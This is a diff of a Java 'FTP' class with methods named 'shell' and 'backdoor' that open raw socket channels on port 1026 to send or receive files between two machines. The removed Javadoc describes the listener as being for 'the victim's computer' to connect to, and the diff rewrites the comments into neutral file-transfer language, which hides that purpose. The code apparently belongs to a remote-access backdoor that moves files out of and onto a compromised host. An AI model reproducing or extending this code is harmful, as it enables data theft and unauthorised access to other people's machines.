@@ -14,74 +14,63 @@ import java.nio.Buffer;
 public class FTP {
 
 	/**
-	 * Opens a ServerSocketChannel for the victim's computer to connect to and
-	 * transfer files with.
+	 * Transfers a file with client.
+	 * <p>
+	 * Opens {@link java.nio.channels.ServerSocketChannel}
+	 * {@link serverSocketChannel} and {@link java.nio.channels.SocketChannel}
+	 * {@link socketChannel} for transferring a file with client. If
+	 * {@link protocol} is "send", uses {@link #send} to send file with path
+	 * {@link filePath} to client. If {@link protocol} is "rec", uses {@link #rec}
+	 * to receive file with path {@link filePath} from client.
 	 *
-	 * @param filePath path of file to send or receive
-	 * @param protocol directions to send or receive files
-	 * @return state of completion
+	 * @param filePath path of file to transfer
+	 * @param protocol if file should be sent or received
+	 * @throws IOException
 	 */
-	public static boolean shell(String filePath, String protocol) {
-		ServerSocketChannel serverSocketChannel = null;
-		SocketChannel socketChannel = null;
-		try {
-			serverSocketChannel = ServerSocketChannel.open();
-			serverSocketChannel.socket().bind(new InetSocketAddress(1026));
-			socketChannel = serverSocketChannel.accept();
-			if (protocol.equals("send"))
-				send(filePath, socketChannel);
-			else if (protocol.equals("rec"))
-				rec(filePath, socketChannel);
-			return true;
-		} catch (Exception e) {
-			return false;
-		} finally {
-			try {
-				if (serverSocketChannel != null)
-					serverSocketChannel.close();
-				if (socketChannel != null)
-					socketChannel.close();
-			} catch (Exception e) {
-			}
-		}
+	public static void shell(String filePath, String protocol) throws IOException {
+		ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+		serverSocketChannel.socket().bind(new InetSocketAddress(1026));
+		SocketChannel socketChannel = serverSocketChannel.accept();
+		if (protocol.equals("send"))
+			send(filePath, socketChannel);
+		else if (protocol.equals("rec"))
+			rec(filePath, socketChannel);
+		serverSocketChannel.close();
+		socketChannel.close();
 	}
 
 	/**
-	 * Opens a SocketChannel to connect to the server and transfer files with.
-	 *
-	 * @param filePath path of file to send or receive
-	 * @param protocol directions to send or receive files
-	 * @param ip       IP address of server
-	 * @return state of completion
+	 * Transfers a file with server.
+	 * <p>
+	 * Opens {@link java.nio.channels.SocketChannel} {@link socketChannel} for
+	 * transferring file with server with an IPv4 address of {@link ip}. If
+	 * {@link protocol} is "send", uses {@link #send} to send file with path
+	 * {@link filePath} to server. If {@link protocol} is "rec", uses {@link #rec}
+	 * to receive file with path {@link filePath} from server.
+	 * 
+	 * @param filePath path of file to transfer
+	 * @param protocol if file should be sent or received
+	 * @param ip       IPv4 address of server to transfer file with
+	 * @throws IOException
 	 */
-	public static boolean backdoor(String filePath, String protocol, String ip) {
-		SocketChannel socketChannel = null;
-		try {
-			socketChannel = SocketChannel.open();
-			SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
-			socketChannel.connect(socketAddress);
-			if (protocol.equals("send"))
-				send(filePath, socketChannel);
-			else if (protocol.equals("rec"))
-				rec(filePath, socketChannel);
-			return true;
-		} catch (Exception e) {
-			e.printStackTrace();
-			return false;
-		} finally {
-			try {
-				if (socketChannel != null)
-					socketChannel.close();
-			} catch (Exception e) {
-			}
-		}
+	public static void backdoor(String filePath, String protocol, String ip) throws IOException {
+		SocketChannel socketChannel = SocketChannel.open();
+		SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
+		socketChannel.connect(socketAddress);
+		if (protocol.equals("send"))
+			send(filePath, socketChannel);
+		else if (protocol.equals("rec"))
+			rec(filePath, socketChannel);
+		socketChannel.close();
 	}
 
 	/**
-	 * Sends file over {@link socketChannel} via {@link fileChannel}.
+	 * Sends file with path {@link filePath} using {@link socketChannel} and
+	 * {@link fileChannel}.
 	 *
 	 * @param filePath      path of file to send
-	 * @param socketChannel Socket Channel
+	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
+	 *                      sending
 	 * @throws IOException
 	 */
 	private static void send(String filePath, SocketChannel socketChannel) throws IOException {
@@ -98,10 +87,12 @@ public class FTP {
 	}
 
 	/**
-	 * Receives file over {@link socketChannel} via {@link fileChannel}.
+	 * Receives file with path {@link filePath} using {@link socketChannel} and
+	 * {@link fileChannel}.
 	 *
 	 * @param filePath      path of file to receive
-	 * @param socketChannel Socket Channel
+	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
+	 *                      receiving
 	 * @throws IOException
 	 */
 	private static void rec(String filePath, SocketChannel socketChannel) throws IOException {
